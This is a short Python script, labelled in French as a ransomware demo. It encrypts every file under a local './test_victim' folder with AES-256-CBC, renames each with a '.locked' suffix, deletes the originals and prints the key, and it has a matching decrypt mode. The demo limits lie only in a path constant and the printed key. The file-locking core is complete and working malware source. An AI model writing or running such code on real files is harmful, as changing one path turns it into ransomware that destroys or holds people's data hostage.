# Ransomware DEMO — AES-256-CBC, répertoire local uniquement, clé stdout
# deps: pycryptodome
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from pathlib import Path
import sys

TARGET = Path("./test_victim")
EXT    = ".locked"
SKIP   = {".py",".exe",".dll",EXT}

def enc(path: Path, key: bytes):
    iv = get_random_bytes(16)
    ct = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(path.read_bytes(), 16))
    path.with_suffix(path.suffix+EXT).write_bytes(iv+ct)
    path.unlink()

def dec(path: Path, key: bytes):
    raw = path.read_bytes(); iv,ct = raw[:16],raw[16:]
    pt  = unpad(AES.new(key,AES.MODE_CBC,iv).decrypt(ct), 16)
    Path(str(path)[:-len(EXT)]).write_bytes(pt); path.unlink()

if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv)>1 else "encrypt"
    if mode == "encrypt":
        key = get_random_bytes(32)
        print(f"[KEY] {key.hex()}  ← save this")
        for p in TARGET.rglob("*"):
            if p.is_file() and p.suffix not in SKIP:
                enc(p, key); print(f"  enc {p}")
    elif mode == "decrypt":
        if len(sys.argv)<3: sys.exit("usage: charon.py decrypt <hex_key>")
        key = bytes.fromhex(sys.argv[2])
        for p in TARGET.rglob(f"*{EXT}"):
            dec(p, key); print(f"  dec {p}")
    